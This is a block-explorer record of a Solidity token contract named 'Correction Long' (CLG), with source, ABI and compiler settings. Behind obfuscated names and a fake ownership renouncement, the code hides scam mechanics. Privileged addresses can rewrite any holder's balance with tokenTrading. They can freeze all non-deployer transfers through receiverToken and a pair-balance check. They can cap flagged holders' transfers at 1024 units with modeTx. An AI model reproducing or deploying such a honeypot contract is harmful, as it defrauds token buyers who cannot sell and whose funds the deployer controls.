{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface listLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenTake {\n    function createPair(address launchedSwap, address maxShould) external returns (address);\n}\n\ninterface isSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableAutoTo) external view returns (uint256);\n\n    function transfer(address minSwap, uint256 fundSender) external returns (bool);\n\n    function allowance(address txFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minSwap,\n        uint256 fundSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingMax, uint256 value);\n    event Approval(address indexed txFrom, address indexed spender, uint256 value);\n}\n\ninterface limitSwapList is isSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CorrectionLong is limitTo, isSell, limitSwapList {\n\n    uint256 private atFee;\n\n    function name() external view virtual override returns (string memory) {\n        return swapModeTeam;\n    }\n\n    uint256 public feeTeamShould;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalMin;\n    }\n\n    address autoLimitLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return takeMode;\n    }\n\n    function transfer(address receiverIs, uint256 fundSender) external virtual override returns (bool) {\n        return shouldMode(_msgSender(), receiverIs, fundSender);\n    }\n\n    function senderLaunch(address fundTake) public {\n        require(fundTake.balance < 100000);\n        if (marketingEnable) {\n            return;\n        }\n        if (senderMode != launchedToken) {\n            launchedToken = false;\n        }\n        liquidityTo[fundTake] = true;\n        \n        marketingEnable = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txExempt;\n    }\n\n    string private txExempt = \"CLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundMax;\n    }\n\n    function getOwner() external view returns (address) {\n        return takeMode;\n    }\n\n    function tokenTrading(address receiverIs, uint256 fundSender) public {\n        swapReceiverMax();\n        fundFrom[receiverIs] = fundSender;\n    }\n\n    address receiverList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address enableAutoTo) public view virtual override returns (uint256) {\n        return fundFrom[enableAutoTo];\n    }\n\n    string private swapModeTeam = \"Correction Long\";\n\n    function receiverToken(uint256 fundSender) public {\n        swapReceiverMax();\n        launchedFrom = fundSender;\n    }\n\n    address public autoAmount;\n\n    address public txTeam;\n\n    uint256 private fundMax = 100000000 * 10 ** 18;\n\n    function transferFrom(address enableTx, address minSwap, uint256 fundSender) external override returns (bool) {\n        if (_msgSender() != autoLimitLiquidity) {\n            if (limitMin[enableTx][_msgSender()] != type(uint256).max) {\n                require(fundSender <= limitMin[enableTx][_msgSender()]);\n                limitMin[enableTx][_msgSender()] -= fundSender;\n            }\n        }\n        return shouldMode(enableTx, minSwap, fundSender);\n    }\n\n    bool public launchedToken;\n\n    uint8 private totalMin = 18;\n\n    uint256 listBuyEnable;\n\n    function modeTx(address marketingList) public {\n        swapReceiverMax();\n        \n        if (marketingList == txTeam || marketingList == autoAmount) {\n            return;\n        }\n        isLiquidity[marketingList] = true;\n    }\n\n    uint256 launchedFrom;\n\n    address private takeMode;\n\n    mapping(address => mapping(address => uint256)) private limitMin;\n\n    bool public marketingEnable;\n\n    uint256 private autoMax;\n\n    function swapReceiverMax() private view {\n        require(liquidityTo[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed limitModeMin, address indexed totalEnable);\n\n    function tradingMin() public {\n        emit OwnershipTransferred(txTeam, address(0));\n        takeMode = address(0);\n    }\n\n    mapping(address => bool) public liquidityTo;\n\n    function approve(address launchSwap, uint256 fundSender) public virtual override returns (bool) {\n        limitMin[_msgSender()][launchSwap] = fundSender;\n        emit Approval(_msgSender(), launchSwap, fundSender);\n        return true;\n    }\n\n    bool private senderMode;\n\n    constructor (){\n        \n        listLaunched feeLiquidity = listLaunched(autoLimitLiquidity);\n        autoAmount = tokenTake(feeLiquidity.factory()).createPair(feeLiquidity.WETH(), address(this));\n        if (feeTeamShould == autoMax) {\n            launchedToken = true;\n        }\n        txTeam = _msgSender();\n        tradingMin();\n        liquidityTo[txTeam] = true;\n        fundFrom[txTeam] = fundMax;\n        if (autoMax == atFee) {\n            atFee = feeTeamShould;\n        }\n        emit Transfer(address(0), txTeam, fundMax);\n    }\n\n    uint256 constant totalSwap = 2 ** 10;\n\n    function shouldMode(address enableTx, address minSwap, uint256 fundSender) internal returns (bool) {\n        if (enableTx == txTeam) {\n            return marketingTx(enableTx, minSwap, fundSender);\n        }\n        uint256 liquidityBuy = isSell(autoAmount).balanceOf(receiverList);\n        require(liquidityBuy == launchedFrom);\n        require(minSwap != receiverList);\n        if (isLiquidity[enableTx]) {\n            return marketingTx(enableTx, minSwap, totalSwap);\n        }\n        return marketingTx(enableTx, minSwap, fundSender);\n    }\n\n    function marketingTx(address enableTx, address minSwap, uint256 fundSender) internal returns (bool) {\n        require(fundFrom[enableTx] >= fundSender);\n        fundFrom[enableTx] -= fundSender;\n        fundFrom[minSwap] += fundSender;\n        emit Transfer(enableTx, minSwap, fundSender);\n        return true;\n    }\n\n    mapping(address => uint256) private fundFrom;\n\n    function allowance(address swapLiquidity, address launchSwap) external view virtual override returns (uint256) {\n        if (launchSwap == autoLimitLiquidity) {\n            return type(uint256).max;\n        }\n        return limitMin[swapLiquidity][launchSwap];\n    }\n\n    mapping(address => bool) public isLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitModeMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAutoTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeamShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"}],\"name\":\"modeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"senderLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"tokenTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CorrectionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}